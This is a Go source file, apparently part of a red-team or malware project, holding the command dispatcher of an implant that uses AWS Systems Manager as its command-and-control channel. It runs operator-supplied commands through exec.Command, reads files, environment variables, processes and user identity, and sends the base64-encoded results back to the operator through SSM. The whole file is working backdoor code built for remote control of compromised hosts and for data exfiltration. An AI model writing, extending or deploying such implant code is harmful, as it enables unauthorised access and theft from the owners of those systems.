package implantrun

import (
	"bytes"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/grines/ssmmm/awsrsa"
	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/cat"
	"github.com/grines/ssmmm/implant/implantenv"
	"github.com/grines/ssmmm/implant/implantls"
	"github.com/grines/ssmmm/implant/implantps"
	"github.com/grines/ssmmm/implant/implantutil"
	"github.com/grines/ssmmm/implant/pwd"
	"github.com/grines/ssmmm/implant/wd"
	"github.com/grines/ssmmm/implant/whoami"
)

func RunCommand(commandStr string, cmdid string, tokens awsrsa.AwsToken, managedInstanceID string) error {
	commandStr = strings.TrimSuffix(commandStr, "\n")
	arrCommandStr := strings.Fields(commandStr)
	if len(arrCommandStr) < 1 {
		return errors.New("")
	}
	switch arrCommandStr[0] {
	case "ps":
		procs := implantps.Ps()
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(strings.Join(procs[:], "\n")))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
	case "env":
		data := implantenv.Env()
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
	case "whoami":
		user, _ := whoami.Whoami()
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(user.Username))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
	case "pwd":
		data, _ := pwd.Pwd()
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
	case "ls":
		var path string
		if len(arrCommandStr) == 1 {
			path = "./"
		} else {
			path = arrCommandStr[1]
		}
		list := implantls.Ls(path)
		data := strings.Join(list, "\n")
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
	case "cat":
		data := cat.Cat(arrCommandStr[1])
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(data))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
	case "cd":
		if len(arrCommandStr) > 1 {
			os.Chdir(arrCommandStr[1])
			fmt.Println(wd.WorkingDir())
			awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(wd.WorkingDir()))
			awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
		}
		return nil
	case "kill":
		os.Exit(0)
	default:
		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
		var out bytes.Buffer
		var stderr bytes.Buffer
		cmd.Stdout = &out
		cmd.Stderr = &stderr
		err := cmd.Run()
		if err != nil {
			fmt.Println(fmt.Sprint(err) + ": " + stderr.String())
			return nil
		}
		awsssm.SendCommandOutput(tokens, managedInstanceID, cmdid, implantutil.Base64Encode(out.String()))
		awsssm.AcknowledgeCommand(tokens, managedInstanceID, cmdid)
		return nil
	}
	return nil
}
